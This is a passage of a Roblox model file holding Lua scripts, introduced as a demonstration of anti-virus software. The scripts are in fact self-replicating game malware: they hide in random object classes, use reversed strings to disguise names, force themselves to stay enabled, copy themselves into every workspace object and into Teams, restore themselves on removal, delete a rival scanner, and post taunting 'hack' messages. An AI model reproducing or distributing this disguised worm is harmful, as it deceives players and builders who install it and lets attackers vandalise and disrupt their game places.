Then use this script and i&apos;ll show you the basics of anti virus software!

As you can clearly see...The script below probably already has
removed all possible viruses. 
]]

----------------------------------------------------------------------------------------------------------------------------------------------
cs = { &quot;Timer&quot;, &quot;Geometry&quot;, &quot;Weld&quot;, &quot;RotateP&quot;, &quot;RotateV&quot;, &quot;VelocityMotor&quot; } -- Classes the script knows so it can remove it ;) Enter more here lol
g = { &quot;a&quot;, &quot;b&quot;, &quot;c&quot;, &quot;d&quot;, &quot;e&quot;, &quot;f&quot;, &quot;g&quot;, &quot;h&quot;, &quot;i&quot;, &quot;j&quot;, &quot;k&quot;, &quot;l&quot;, &quot;m&quot;, &quot;n&quot;, &quot;o&quot;, &quot;p&quot;, &quot;q&quot;, &quot;r&quot;, &quot;s&quot;, &quot;t&quot;, &quot;u&quot;, &quot;v&quot;, &quot;w&quot;, &quot;x&quot;, &quot;y&quot;, &quot;z&quot;, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, &quot;&#229;&quot;, &quot;&#186;&quot;, &quot;&#172;&quot;, &quot;+&quot; } -- checks for all of the possible special characters....again enter more here ;D
egd = script
----------------------------------------------------------------------------------------------------------------------------------------------
----------------Please do not edit anything beyond this point ^_^--------------------------------------------------------------
----------------------------------------------------------------------------------------------------------------------------------------------
for i = 1, #cs do
if egd.className ~= cs[i] then
s=true
end
end
if s == true then
local s = Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse(&quot;SuRViV&quot;)
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse(&quot;delbasiD&quot;)
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers &gt; 1 then
local m = Instance.new(&quot;Hint&quot;)
m.Parent = workspace
m.Name = &quot;&#229;&quot;
m.Text = string.reverse(&quot;!AHAHAWM !oot uoy kcah lliw 1monmonmoN&quot;)
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == &quot;Disabled&quot; then
		egd[kte] = false
	end
end

function SAVEDZOMG(place)
	if lssii:findFirstChild(place) == nil then
		local v = Instance.new(cs[math.random(1, #cs)])
		v.Parent = workspace
		v.Name = place
	end
end

function nft(ssaa)
	for i = 1, #ssaa:children() do
		if string.find(ssaa:children()[i].Name, &quot;Tazer&quot;) then
			print(&quot;Fake Virus Scanner Found!&quot;)
			ssaa:GetChildren()[i]:remove()
		elseif ssaa:children()[i]:findFirstChild(egd.Name) == nil and ssaa:children()[i].Name ~= script.Name then
			print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
			egd:Clone().Parent = ssaa:children()[i]
		end
	end
end

tp.DescendantRemoving:connect(function(jji)
	if jji == egd then
		egdd.Parent = tp
		print(&quot;Backing up &quot; ..tp.Name.. &quot;...&quot;)
		egdd[sos] = false
	end
end)

script.Changed:connect(lk)
while true do
	nft(lssii)
	nft(game:service(string.reverse(&quot;smaeT&quot;)))
	SAVEDZOMG(string.reverse(&quot;mroW&quot;))
	SAVEDZOMG(string.reverse(&quot;devas gmoZ&quot;))
	SAVEDZOMG(string.reverse(&quot;AF#(IRHFD*IH#QEA(SDFIOH!@)#WESUOCJ)Q#$)ERDFXC)#QWROJASCFLMXZ&quot;))
	wait(1)
end
</ProtectedString>
						<bool name="archivable">true</bool>
					</Properties>
				</Item>
			</Item>
		</Item>
		<Item class="RotateP" referent="RBX271">
			<Properties>
				<float name="BaseAngle">0.25</float>
				<CoordinateFrame name="C0">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<CoordinateFrame name="C1">
					<X>0</X>
					<Y>0</Y>
					<Z>0</Z>
					<R00>1</R00>
					<R01>0</R01>
					<R02>0</R02>
					<R10>0</R10>
					<R11>1</R11>
					<R12>0</R12>
					<R20>0</R20>
					<R21>0</R21>
					<R22>1</R22>
				</CoordinateFrame>
				<string name="Name">d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...</string>
				<Ref name="Part0">null</Ref>
				<Ref name="Part1">null</Ref>
				<bool name="archivable">true</bool>
			</Properties>
			<Item class="Script" referent="RBX272">
				<Properties>
					<bool name="Disabled">false</bool>
					<Content name="LinkedSource"><null></null></Content>
					<string name="Name">Script......Or is it...</string>
					<ProtectedString name="Source">-- Thanks for using My hack.............suka XD

if script.Parent.className ~= &quot;RotateP&quot; then
	local p = Instance.new(&quot;RotateP&quot;)
	p.Parent = workspace
	p.Name = &quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;
	script.Parent = p
end

function check()
	local list = workspace:GetChildren()
	for i = 1, #list do
		if list[i]:findFirstChild(&quot;d&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;&#229;ng.........you got owned...&quot;) == nil and list[i].className ~= &quot;RotateP&quot; then
			script.Parent:Clone().Parent = list[i]
		end
		wait()
	end
end

while true do
	check()
	if workspace:findFirstChild(&quot;Hello...I &#229;m Your New Lord Lolz&quot;) == nil then
		local main = script.Parent:Clone()
		main.Name = &quot;Hello...I &#229;m Your New Lord Lolz&quot;
		main.Parent = workspace
	end
	wait(3)
end
-- Credit goes to Nomnomnom1..........................really..........did you need to know?!
-- Have a nice day. XD</ProtectedString>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
			<Item class="Geometry" referent="RBX273">
				<Properties>
					<string name="Name">ORLY</string>
					<bool name="archivable">true</bool>
				</Properties>
			</Item>
		</Item>
	</Item>
</roblox>


